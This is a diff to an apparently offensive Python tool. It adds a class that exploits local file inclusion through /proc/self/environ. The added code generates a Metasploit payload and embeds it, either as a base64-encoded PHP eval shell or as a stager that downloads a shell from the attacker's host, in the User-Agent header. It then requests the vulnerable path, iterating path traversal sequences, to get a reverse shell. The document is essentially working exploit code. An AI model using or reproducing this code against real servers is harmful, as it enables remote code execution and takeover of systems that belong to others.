@@ -254,6 +254,50 @@ class Logs:
         except requests.exceptions.RequestException as access_error:
             print t.red(" [!] HTTP Error ")(access_error)
 
+class Environ:
+
+    def __init__(self, target, nostager, relative):
+
+        self.target = target
+        self.nostager = nostager
+        self.relative = relative
+        self.location = "/proc/self/environ"
+
+    def execute_environ(self):
+
+        lhost, lport, shell = msf_payload()
+
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
+        if self.nostager:
+            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
+            payload_file.close()
+            progressbar()
+        else:
+            payload = stager_payload.format(lhost, shell)
+            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
+            print(t.green(" [*] ") + "Downloading Shell")
+            progressbar()
+        lfi = self.target + self.location
+        headers = {'User-Agent': payload}
+
+        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
+        try:
+            if not self.relative:
+                r = requests.get(lfi, headers=headers)
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+            else:
+                for path_traversal_sequence in path_traversal_sequences:
+                    for counter in xrange(10):
+                        lfi = self.target + path_traversal_sequence*counter + self.location
+                        r = requests.get(lfi, headers=headers)  # pull down shell from poisoned logs
+                        if r.status_code != 200:
+                            print(t.red(" [!] Unexpected HTTP Response "))
+        except requests.exceptions.RequestException as access_error:
+            print t.red(" [!] HTTP Error ")(access_error)
 
 class SSHLogs:
 
